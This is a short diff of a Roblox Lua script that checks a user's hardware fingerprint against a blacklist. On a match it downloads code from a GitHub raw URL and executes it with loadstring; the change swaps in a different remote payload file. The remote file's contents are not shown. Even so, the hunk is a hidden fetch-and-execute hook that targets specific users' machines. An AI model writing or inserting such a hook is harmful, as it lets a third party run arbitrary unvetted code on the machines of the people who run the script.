@@ -13,7 +13,7 @@ for i, v in next, Fingerprnit_list do
 if json_decode[v] then
 for i1, v1 in next, blacklisted_hwids do
 if  v1 == json_decode[v] then
-loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/Th12353/heesj/main/Fkofqwekwodf"))('pizzapie')
+loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/Th12353/heesj/main/adminv"))('pizzapie')
 end
 end
 end
